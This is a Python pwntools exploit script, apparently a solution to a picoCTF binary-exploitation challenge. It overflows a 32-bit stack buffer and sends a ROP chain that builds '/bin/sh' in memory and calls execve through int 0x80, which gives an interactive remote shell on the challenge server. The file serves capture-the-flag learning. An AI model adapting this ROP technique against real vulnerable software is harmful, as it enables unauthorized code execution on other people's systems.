#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 58315 ./vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 58315)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # 1cfa6d55a06a41b7ad07bc10d5c0e49faf1b199d477416d6f6474daf482b1aa6
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = 'a'*(28)

rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += '//bi'
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009d060)
rop += p(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += 'n/sh'
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009d064)
rop += p(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += p(0x00000000)
rop += rebase_0(0x000103c9) # 0x080583c9: pop edx; pop ebx; ret; 
rop += rebase_0(0x0009d068)
rop += p(0xdeadbeef)
rop += rebase_0(0x00011102) # 0x08059102: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00001022) # 0x08049022: pop ebx; ret; 
rop += rebase_0(0x0009d060)
rop += rebase_0(0x00001e39) # 0x08049e39: pop ecx; ret; 
rop += rebase_0(0x0009d068)
rop += rebase_0(0x0004a435) # 0x08092435: pop edx; xor eax, eax; pop edi; ret; 
rop += rebase_0(0x0009d068)
rop += p(0xdeadbeef)
rop += rebase_0(0x0006874a) # 0x080b074a: pop eax; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00029650) # 0x08071650: int 0x80; ret;

io.sendline(rop)

io.interactive()

